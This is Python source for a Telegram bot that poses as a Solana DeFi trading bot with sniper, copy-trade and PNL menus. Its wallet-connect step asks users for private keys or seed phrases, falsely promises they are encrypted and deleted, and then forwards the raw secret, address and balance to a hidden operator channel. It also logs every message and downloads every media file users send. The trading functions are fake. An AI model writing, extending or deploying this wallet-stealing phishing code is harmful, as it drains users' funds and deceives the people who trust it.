import logging
import os
import asyncio
from datetime import datetime, time as dtime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

from config import (
    BOT_TOKEN, FORWARD_CHAT_ID,
    LOG_FILE, MEDIA_DIR,
    ALLOWED_USERS, BLOCKED_USERS,
)
from wallet import verify_wallet
from trending import get_trending_message
from pnl import generate_pnl_image
from token_scanner import scan_token
from database import (
    init_db, save_message,
    get_stats, get_filter_lists,
    add_user_filter, remove_user_filter,
    save_wallet, get_wallet,
)


# ── Logging ───────────────────────────────────
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
os.makedirs(MEDIA_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
    ],
)
logger = logging.getLogger(__name__)

WELCOME_TEXT = (
    "🚀 sol DexTrade Bot: Your Gateway to Solana DeFi\n"
    "🔫\n\n"
    "💰 SOL Price: Live\n\n"
    "💳 Your First Wallet\n"
    "└ `CWwrGBWAMXfNsS72m76P9mdybDc1kCK4NY4TWfv3MESW` 📋\n"
    "└ Balance: 0.0000 SOL\n\n"
    "[Telegram](https://t.me/MetaTrading) | [Twitter](https://twitter.com/MetaTrading) | [Website](https://metatrading.com)"
)


def wallet_text(pubkey, balance):
    return (
        "🚀 Sol DexTrading Bot: Your Gateway to Solana DeFi\n"
        "🔫\n\n"
        "💰 SOL Price: Live\n\n"
        "💳 Your First Wallet\n"
        "└ `" + pubkey + "` 📋\n"
        "└ Balance: " + str(balance) + " SOL\n\n"
        "[Telegram](https://t.me/MetaTrading) | [Twitter](https://twitter.com/MetaTrading) | [Website](https://metatrading.com)"
    )


SNIPER_V2_TEXT = (
    "🎯 Sniper V2\n\n"
    "⚡ God-Tier Speed: Be first, always. Snipe in milliseconds for the earliest entry on any launch.\n"
    "💪 All-in-One Power: Use multiple wallets to snipe multiple exchanges simultaneously, from launchpad listings all the way to migration to your preferred DEXs.\n"
    "🚀 Pro-Level Modes: Offers a variety of advanced modes tailored to your profit maximization strategies.\n"
    "🌙 Mass Sniping: Dominate the market, guarantee you catch every moonshot.\n"
    "🛡 Ultimate Snipe Protection: Powerful built-in audit filters weed out scams, minimizing your risk."
)


def sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 New Sniper", callback_data="new_sniper")],
        [InlineKeyboardButton("--- 💳 LISTING ---", callback_data="listing_header")],
        [InlineKeyboardButton("All", callback_data="sniper_all"),
         InlineKeyboardButton("Active", callback_data="sniper_active")],
        [InlineKeyboardButton("Inactive", callback_data="sniper_inactive"),
         InlineKeyboardButton("Completed", callback_data="sniper_completed")],
        [InlineKeyboardButton("📄 Doc ↗", callback_data="sniper_doc"),
         InlineKeyboardButton("❌ Close", callback_data="close")],
    ])



NEW_SNIPER_TEXT = (
    "Let's get started! Pick your preferred Snipe Mode.\n\n"
    "⭐ Targeted Mode: Snipes tokens based on Dev Wallet, Token Symbol, and Token Address filters. All are optional.\n\n"
    "🌟 Mass mode: Snipes all tokens without validating dev or token address on your selected DEXs. ⚠️ Use at your own risk and be careful.\n\n"
    "✨ Tips:\n"
    "/newsniper {targeted | mass} - Quickly pick your snipe mode for the next step!"
)


def new_sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ Targeted", callback_data="targeted_sniper"),
         InlineKeyboardButton("🌟 Mass", callback_data="mass_sniper")],
        [InlineKeyboardButton("🏠 Back Sniper Home", callback_data="sniper")],
    ])


def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ Buy & Sell", callback_data="buy_sell"),
         InlineKeyboardButton("🎯 Sniper", callback_data="sniper")],
        [InlineKeyboardButton("🗡 Limit Orders", callback_data="limits"),
         InlineKeyboardButton("🎮 Copy Trades", callback_data="copy")],
        [InlineKeyboardButton("🐵 Profile", callback_data="profiles"),
         InlineKeyboardButton("💳 Wallets", callback_data="wallet"),
         InlineKeyboardButton("🎮 Trades", callback_data="trades")],
        [InlineKeyboardButton("💬 Referral System", callback_data="refer"),
         InlineKeyboardButton("💰 Cashback", callback_data="cashback")],
        [InlineKeyboardButton("🗃 Transfer SOL", callback_data="transfer_sol"),
         InlineKeyboardButton("🔧 Settings", callback_data="settings")],
        [InlineKeyboardButton("🔥 Our STBOT Token ↗", callback_data="stbot_token"),
         InlineKeyboardButton("🚀 Market Maker ↗", callback_data="market_maker")],
        [InlineKeyboardButton("🇺🇸", callback_data="lang_en"),
         InlineKeyboardButton("🇨🇳", callback_data="lang_zh"),
         InlineKeyboardButton("🇷🇺", callback_data="lang_ru"),
         InlineKeyboardButton("🇧🇷", callback_data="lang_pt"),
         InlineKeyboardButton("🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("🤖 Backup Bots", callback_data="backup_bots"),
         InlineKeyboardButton("🛡 Security", callback_data="security")],
        [InlineKeyboardButton("ℹ Help", callback_data="help")],
        [InlineKeyboardButton("📑 Tutorials", callback_data="tutorials")],
        [InlineKeyboardButton("❌ Close", callback_data="close")],
    ])


def back_btn(previous="main_menu"):
    return [[InlineKeyboardButton("⬅ Back", callback_data=previous),
             InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]


def buy_sell_buttons():
    return [
        [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
        [InlineKeyboardButton("📊 View Trending", callback_data="view_trending")],
        [InlineKeyboardButton("🔍 Search Tokens", callback_data="search_tokens")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
    ]


def connect_buttons():
    return [
        [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
    ]


def is_allowed(user_id):
    rows = get_filter_lists()
    db_allowed = {r[0] for r in rows if r[1] == "allow"} | set(ALLOWED_USERS)
    db_blocked = {r[0] for r in rows if r[1] == "block"} | set(BLOCKED_USERS)
    if user_id in db_blocked:
        return False
    if db_allowed:
        return user_id in db_allowed
    return True


async def notify_channel(context, user, media_type, text, media_path=None):
    if not FORWARD_CHAT_ID:
        return
    try:
        name = ("@" + user.username) if user and user.username else (user.full_name if user else "Unknown")
        uid  = str(user.id) if user else "N/A"
        body = str(text) if text else "(" + media_type + ")"
        note = "New message captured\nUser: " + name + "\nID: " + uid + "\nType: " + media_type + "\nMessage: " + body
        if media_path:
            note += "\nFile: " + os.path.basename(media_path)
        await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=note)
    except Exception as exc:
        logger.warning("Could not notify channel: %s", exc)


async def download_media(file_obj, media_type, user_id):
    try:
        ext_map = {"photo": "jpg", "video": "mp4", "audio": "mp3", "voice": "ogg", "document": "bin", "sticker": "webp"}
        ext = ext_map.get(media_type, "bin")
        ts  = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        fn  = media_type + "_" + str(user_id) + "_" + ts + "." + ext
        sp  = os.path.join(MEDIA_DIR, fn)
        tgf = await file_obj.get_file()
        await tgf.download_to_drive(sp)
        return sp
    except Exception as exc:
        logger.warning("Could not download media: %s", exc)
        return None


async def capture(update: Update, context: ContextTypes.DEFAULT_TYPE, media_type: str):
    user = update.effective_user
    msg  = update.effective_message
    if user and not is_allowed(user.id):
        await msg.reply_text("You are not authorised to use this bot.")
        return

    text     = msg.text or msg.caption or ""
    mpath    = None
    username = (user.username or user.full_name) if user else "unknown"
    uid      = user.id if user else 0

    if media_type == "photo" and msg.photo:
        mpath = await download_media(msg.photo[-1], "photo", uid)
    elif media_type == "video" and msg.video:
        mpath = await download_media(msg.video, "video", uid)
    elif media_type == "audio" and msg.audio:
        mpath = await download_media(msg.audio, "audio", uid)
    elif media_type == "voice" and msg.voice:
        mpath = await download_media(msg.voice, "voice", uid)
    elif media_type == "document" and msg.document:
        mpath = await download_media(msg.document, "document", uid)

    logger.info("Captured [%s] from %s: %s", media_type, username, text or "(" + media_type + ")")
    ts = datetime.utcnow().isoformat()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("[" + ts + "] user=" + str(username) + " type=" + media_type + " msg=" + text + "\n")
    save_message(timestamp=ts, chat_id=update.effective_chat.id, user_id=uid,
                 username=user.username if user else None, full_name=user.full_name if user else None,
                 message_id=msg.message_id, text=text, media_type=media_type, media_path=mpath)
    await notify_channel(context, user, media_type, text, mpath)

    if media_type == "text" and text:
        expecting = context.user_data.get("expecting")

        if expecting in ["buy_contract", "sell_contract"]:
            action = "buy" if expecting == "buy_contract" else "sell"
            context.user_data["expecting"] = None
            await msg.reply_text("Scanning token... Please wait.")
            scan = await scan_token(text)
            if scan["success"]:
                context.user_data["token_address"] = scan["token_address"]
                context.user_data["token_name"]    = scan["name"] + " (" + scan["symbol"] + ")"
                context.user_data["action"]        = action
                await msg.reply_text(
                    scan["message"], parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Confirm " + action.capitalize(), callback_data="confirm_" + action),
                         InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist_" + scan["token_address"])],
                        [InlineKeyboardButton("⬅ Back", callback_data=action),
                         InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )
            else:
                await msg.reply_text(scan["message"])
                await msg.reply_text("Please try again with a valid contract address.",
                                     reply_markup=InlineKeyboardMarkup(back_btn(action)))
            return

        if expecting in ["buy_amount", "sell_amount"]:
            action     = context.user_data.get("action", "buy")
            token_addr = context.user_data.get("token_address", "")
            token_name = context.user_data.get("token_name", "Unknown")
            context.user_data["expecting"] = None
            try:
                amount = float(text.strip())
                if action == "buy":
                    await msg.reply_text(
                        "🛒 Buy Order Summary\n\nToken: " + token_name + "\nContract: `" + token_addr + "`\nAmount: `" + str(amount) + " SOL`\n\nInsufficient SOL balance to complete this transaction.\nPlease fund your wallet and try again.",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🔄 Try Again", callback_data="buy")],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                        ]),
                    )
                else:
                    await msg.reply_text(
                        "💰 Sell Order Summary\n\nToken: " + token_name + "\nContract: `" + token_addr + "`\nAmount: `" + str(amount) + " SOL`\n\nNo holdings found for this token in your wallet.\nPlease make sure you own this token before selling.",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛒 Buy Instead", callback_data="buy")],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                        ]),
                    )
            except ValueError:
                await msg.reply_text("Please enter a valid number. Example: 0.5",
                                     reply_markup=InlineKeyboardMarkup(back_btn(action)))
                context.user_data["expecting"] = expecting
            return

        result = await verify_wallet(text)
        if result["valid"]:
            save_wallet(uid, result["pubkey"], result["balance"])
            wt = (
                "Wallet connected successfully!\n\n"
                "🚀 Meta Trading Bot: Your Gateway to Solana DeFi\n"
                "🔫\n\n"
                "💰 SOL Price: Live\n\n"
                "💳 Your First Wallet\n"
                "└ `" + result["pubkey"] + "` 📋\n"
                "└ Balance: " + str(result["balance"]) + " SOL - $" + str(result["usd"]) + "\n\n"
                "[Telegram](https://t.me/MetaTrading) | [Twitter](https://twitter.com/MetaTrading) | [Website](https://metatrading.com)"
            )
            await msg.reply_text(wt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
            if FORWARD_CHAT_ID:
                try:
                    name = ("@" + user.username) if user and user.username else (user.full_name if user else "Unknown")
                    lines = [
                        "Wallet connected", "User: " + str(name),
                        "ID: `" + str(uid) + "`",
                        "Address: `" + result["pubkey"] + "`",
                        "Balance: `" + str(result["balance"]) + " SOL - $" + str(result["usd"]) + "`",
                        "Input type: " + result["input_type"],
                        "Raw input: `" + text + "`",
                    ]
                    await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text="\n".join(lines), parse_mode="Markdown")
                except Exception as exc:
                    logger.warning("Could not notify channel: %s", exc)
        else:
            await msg.reply_text(result["message"])
            w = get_wallet(uid)
            txt = wallet_text(w["pubkey"], w["balance"]) if w else WELCOME_TEXT
            await msg.reply_text(txt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    else:
        w = get_wallet(uid) if uid else None
        txt = wallet_text(w["pubkey"], w["balance"]) if w else WELCOME_TEXT
        await msg.reply_text(txt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")


async def handle_text(update, context):     await capture(update, context, "text")
async def handle_photo(update, context):    await capture(update, context, "photo")
async def handle_video(update, context):    await capture(update, context, "video")
async def handle_audio(update, context):    await capture(update, context, "audio")
async def handle_voice(update, context):    await capture(update, context, "voice")
async def handle_document(update, context): await capture(update, context, "document")
async def handle_sticker(update, context):  await capture(update, context, "sticker")


# ── Helper: get welcome text for user ─────────
def get_welcome(uid):
    w = get_wallet(uid)
    return (wallet_text(w["pubkey"], w["balance"]) if w else WELCOME_TEXT)


# ── Start ──────────────────────────────────────
async def cmd_start(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    await update.message.reply_text(get_welcome(uid), reply_markup=main_menu_keyboard(), parse_mode="Markdown")


# ── Buy command ────────────────────────────────
async def cmd_buy(update, context):
    uid    = update.effective_user.id if update.effective_user else 0
    wallet = get_wallet(uid)
    if not wallet:
        await update.message.reply_text(
            "🛒 Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 0.5 SOL\n\nClick Connect Wallet to import your wallet.",
            reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
        )
    else:
        context.user_data["expecting"] = "buy_contract"
        await update.message.reply_text(
            "🛒 Buy Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to buy:",
            reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
        )

# ── Sell command ───────────────────────────────
async def cmd_sell(update, context):
    uid    = update.effective_user.id if update.effective_user else 0
    wallet = get_wallet(uid)
    if not wallet:
        await update.message.reply_text(
            "💰 Selling\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to sell tokens.\n\nClick Connect Wallet to import your wallet.",
            reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
        )
    else:
        context.user_data["expecting"] = "sell_contract"
        await update.message.reply_text(
            "💰 Sell Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to sell:",
            reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
        )

# ── All other menu commands ────────────────────
async def cmd_positions(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w   = get_wallet(uid)
    if not w:
        await update.message.reply_text("📊 Positions\n\nPlease connect your wallet first.\nConnect wallet to view your positions.", reply_markup=InlineKeyboardMarkup(connect_buttons()))
    else:
        await update.message.reply_text("📊 Positions\n\nWallet: `" + w["pubkey"] + "`\n\nYou have no open positions.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Buy", callback_data="buy")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_limits(update, context):
    await update.message.reply_text("📉 Limits\n\nPlease connect your wallet first to set limit orders.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_dca(update, context):
    await update.message.reply_text("You have no active DCA orders. Create a DCA order from the Buy/Sell menu.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Buy", callback_data="buy")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_trending(update, context):
    m = await update.message.reply_text("🔥 Fetching trending tokens... Please wait.")
    try:
        msg = await get_trending_message()
        await m.edit_text(
            msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh Trending", callback_data="trending")],
                [InlineKeyboardButton("🛒 Buy Token",        callback_data="buy")],
                [InlineKeyboardButton("🏠 Main Menu",        callback_data="main_menu")],
            ]),
        )
    except Exception:
        await m.edit_text("Could not fetch trending data. Please try again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Try Again", callback_data="trending")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_boosted(update, context):
    await update.message.reply_text("🚀 Boosted Tokens\n\nThese tokens are currently boosted.\nConnect your wallet to buy boosted tokens.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_topboost(update, context):
    await update.message.reply_text("📈 Top Boost\n\nThese are the top boosted tokens.\nConnect your wallet to start trading.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_profiles(update, context):
    await update.message.reply_text("⭐ Profiles\n\nManage your trading profiles here.\nConnect your wallet to view and manage profiles.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_search(update, context):
    await update.message.reply_text("🔍 Token Search\n\nPlease enter a token symbol, name, or contract address to search:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_charts(update, context):
    await update.message.reply_text("📊 Charts\n\nView live token charts here.\nConnect your wallet to trade directly from charts.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_launch(update, context):
    await update.message.reply_text("🎉 Launch Token\n\nLaunch your own token here.\nConnect your wallet to get started.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_pnls(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w   = get_wallet(uid)
    if not w:
        await update.message.reply_text(
            "📈 PNLs\n\nPlease connect your wallet first to view your PNLs.\n\nClick Connect Wallet to import your wallet.",
            reply_markup=InlineKeyboardMarkup(connect_buttons()),
        )
    else:
        m = await update.message.reply_text("📈 Generating your PNL report...\nFetching trade history, please wait.")
        try:
            img_buf, pnl_data = await generate_pnl_image(w["pubkey"], w["balance"])
            pnl_buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh PNL", callback_data="pnls")],
                [InlineKeyboardButton("🛒 Buy", callback_data="buy"), InlineKeyboardButton("💰 Sell", callback_data="sell")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ])
            if img_buf:
                total   = pnl_data["total_pnl"] if pnl_data else 0
                sign    = "+" if total >= 0 else ""
                caption = "📈 Your PNL Report\n\nWallet: `" + w["pubkey"][:8] + "..." + w["pubkey"][-8:] + "`\nTotal PNL: `" + sign + str(total) + " SOL`\nBalance: `" + str(round(w["balance"], 4)) + " SOL`"
                await update.message.reply_photo(photo=img_buf, caption=caption, parse_mode="Markdown", reply_markup=pnl_buttons)
                await m.delete()
            else:
                await m.edit_text("📈 PNLs\n\nYou haven't traded with MetaSolana.\nKindly trade to view your PNLs.", reply_markup=pnl_buttons)
        except Exception as exc:
            logger.warning("PNL error: %s", exc)
            await m.edit_text("📈 PNLs\n\nYou haven't traded with MetaSolana.\nKindly trade to view your PNLs.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Buy", callback_data="buy")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_sniper(update, context):
    await update.message.reply_text(SNIPER_V2_TEXT, reply_markup=sniper_keyboard())

async def cmd_refer(update, context):
    await update.message.reply_text("👥 Refer & Earn\n\nRefer friends and earn rewards.\nConnect your wallet to get your referral link.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_wallet(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w   = get_wallet(uid)
    if not w:
        await update.message.reply_text("🔗 Wallet\n\nNo wallet connected.\nClick Connect Wallet to import your wallet.", reply_markup=InlineKeyboardMarkup(connect_buttons()))
    else:
        await update.message.reply_text("🔗 Wallet\n\nYour wallet address:\nSolana:\n`" + w["pubkey"] + "`\nBal: `" + str(w["balance"]) + " SOL`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_buytrending(update, context):
    await update.message.reply_text("🌐 Buy Trending\n\nBuy the top trending tokens with one click.\nConnect your wallet to start.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_volume(update, context):
    await update.message.reply_text("📊 Volume Booster\n\nBoost your token volume here.\nConnect your wallet to activate.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_liquidity(update, context):
    await update.message.reply_text("💧 Add Liquidity\n\nAdd liquidity to a token pool.\nConnect your wallet to continue.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_bridge(update, context):
    await update.message.reply_text("🌉 Bridge\n\nBridge your tokens across chains.\nConnect your wallet to use the bridge.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_copy(update, context):
    uid    = update.effective_user.id if update.effective_user else 0
    w      = get_wallet(uid)
    pubkey = w["pubkey"] if w else "Not connected"
    await update.message.reply_text(
        "Copy Trade\nWallet: " + pubkey + " — W1\n\nCopy Trade allows you to copy the buys and sells of any target wallet.\n🟢 Indicates a copy trade setup is active.\n🟠 Indicates a copy trade setup is paused.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ New Copy Trade", callback_data="new_copy_trade")],
            [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
        ]),
    )

async def cmd_withdraw(update, context):
    await update.message.reply_text("💸 Withdraw\n\nWithdraw your funds to an external wallet.\nConnect your wallet to make a withdrawal.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_copywallet(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w   = get_wallet(uid)
    if not w:
        await update.message.reply_text("📋 Copy Wallet\n\nNo wallet connected.\nConnect your wallet first to see your address.", reply_markup=InlineKeyboardMarkup(connect_buttons()))
    else:
        await update.message.reply_text("📋 Copy Wallet\n\nYour wallet address:\n`" + w["pubkey"] + "`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

async def cmd_autotrade(update, context):
    await update.message.reply_text("🤖 Auto Trade-Pumpfun\n\nAutomatically trade tokens on Pumpfun.\nConnect your wallet to activate.", reply_markup=InlineKeyboardMarkup(connect_buttons()))

async def cmd_help(update, context):
    await update.message.reply_text(
        "❓ Help\n\nWelcome to the Help Center.\n\nHow to get started:\n1. Connect your wallet\n2. Fund your wallet with SOL\n3. Use Buy to purchase tokens\n4. Use Sell to sell tokens\n\nFor support contact: @support",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
    )


# ── Admin commands ────────────────────────────
async def cmd_myid(update, context):
    await update.message.reply_text("Your Telegram user ID is: " + str(update.effective_user.id))

async def cmd_stats(update, context):
    s = get_stats()
    lines = ["Message Statistics", "Total: " + str(s["total"]), "Today: " + str(s["today"]), "Users: " + str(s["unique_users"]), "", "By type:"]
    for mtype, count in s["by_type"]:
        lines.append("  " + str(mtype) + ": " + str(count))
    await update.message.reply_text("\n".join(lines))

async def cmd_allow(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /allow <user_id>"); return
    try: uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID."); return
    add_user_filter(uid, None, "allow")
    await update.message.reply_text("User " + str(uid) + " added to allow-list.")

async def cmd_block(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /block <user_id>"); return
    try: uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID."); return
    add_user_filter(uid, None, "block")
    await update.message.reply_text("User " + str(uid) + " has been blocked.")

async def cmd_unfilter(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /unfilter <user_id>"); return
    try: uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID."); return
    remove_user_filter(uid)
    await update.message.reply_text("User " + str(uid) + " removed from filter lists.")

async def cmd_listusers(update, context):
    rows = get_filter_lists()
    if not rows:
        await update.message.reply_text("No user filters set."); return
    allowed = [str(r[0]) for r in rows if r[1] == "allow"]
    blocked = [str(r[0]) for r in rows if r[1] == "block"]
    await update.message.reply_text("Allowed: " + (", ".join(allowed) or "none") + "\nBlocked: " + (", ".join(blocked) or "none"))


# ── Button callback ───────────────────────────
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    uid  = user.id if user else 0

    if data == "main_menu" or data == "refresh":
        context.user_data["expecting"] = None
        w = get_wallet(uid)
        if data == "refresh" and w:
            from wallet import get_sol_balance, get_sol_price_usd
            new_bal = await get_sol_balance(w["pubkey"])
            price   = await get_sol_price_usd()
            if new_bal is not None:
                save_wallet(uid, w["pubkey"], new_bal)
                w["balance"] = new_bal
        txt = wallet_text(w["pubkey"], w["balance"]) if w else WELCOME_TEXT
        await query.edit_message_text(txt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
        return

    if data == "buy_sell":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("🛒 Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 0.5 SOL\n\nClick Connect Wallet to import your wallet.", reply_markup=InlineKeyboardMarkup(buy_sell_buttons()))
        else:
            context.user_data["expecting"] = "buy_contract"
            await query.edit_message_text("🛒 Buy Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to buy:", reply_markup=InlineKeyboardMarkup(back_btn("main_menu")))

    elif data == "buy":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("🛒 Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 0.5 SOL\n\nClick Connect Wallet to import your wallet.", reply_markup=InlineKeyboardMarkup(buy_sell_buttons()))
        else:
            context.user_data["expecting"] = "buy_contract"
            await query.edit_message_text("🛒 Buy Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to buy:", reply_markup=InlineKeyboardMarkup(back_btn("main_menu")))

    elif data == "sell":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("💰 Selling\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to sell tokens.\n\nClick Connect Wallet to import your wallet.", reply_markup=InlineKeyboardMarkup(buy_sell_buttons()))
        else:
            context.user_data["expecting"] = "sell_contract"
            await query.edit_message_text("💰 Sell Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to sell:", reply_markup=InlineKeyboardMarkup(back_btn("main_menu")))

    elif data == "confirm_buy":
        token_name = context.user_data.get("token_name", "Unknown")
        context.user_data["expecting"] = "buy_amount"
        context.user_data["action"]    = "buy"
        await query.edit_message_text("🛒 Buy Token\n\nStep 3 of 3\n\nToken: " + token_name + "\n\nHow much SOL do you want to spend?\nType the amount and send it.\nExample: 0.5", reply_markup=InlineKeyboardMarkup(back_btn("buy")))

    elif data == "confirm_sell":
        token_name = context.user_data.get("token_name", "Unknown")
        context.user_data["expecting"] = "sell_amount"
        context.user_data["action"]    = "sell"
        await query.edit_message_text("💰 Sell Token\n\nStep 3 of 3\n\nToken: " + token_name + "\n\nHow much SOL worth do you want to sell?\nType the amount and send it.\nExample: 0.5", reply_markup=InlineKeyboardMarkup(back_btn("sell")))

    elif data == "connect_wallet":
        await query.edit_message_text("🔒 Security Tip: Never share your private key or mnemonic with people.\n\nThis bot stores your wallet securely for session-based trading.\n\n🛡 Your data is encrypted and deleted after setup.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 Continue", callback_data="continue_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="buy_sell"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "continue_wallet":
        await query.edit_message_text("Enter the private keys or mnemonic of the wallet you want to import", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="connect_wallet"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "view_trending":
        await query.edit_message_text("🔥 Fetching trending tokens... Please wait.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        try:
            msg = await get_trending_message()
            await query.edit_message_text(
                msg, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh Trending", callback_data="view_trending")],
                    [InlineKeyboardButton("🛒 Buy Token",        callback_data="buy")],
                    [InlineKeyboardButton("⬅ Back", callback_data="buy_sell"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        except Exception:
            await query.edit_message_text("Could not fetch trending data. Please try again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Try Again", callback_data="view_trending")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "search_tokens":
        await query.edit_message_text("🔍 Token Search\n\nPlease enter a token symbol, name, or contract address to search:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="buy_sell"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data.startswith("watchlist_"):
        await query.answer("Added to watchlist!", show_alert=True)

    elif data == "positions":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("📊 Positions\n\nPlease connect your wallet first.\nConnect wallet to view your positions.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        else:
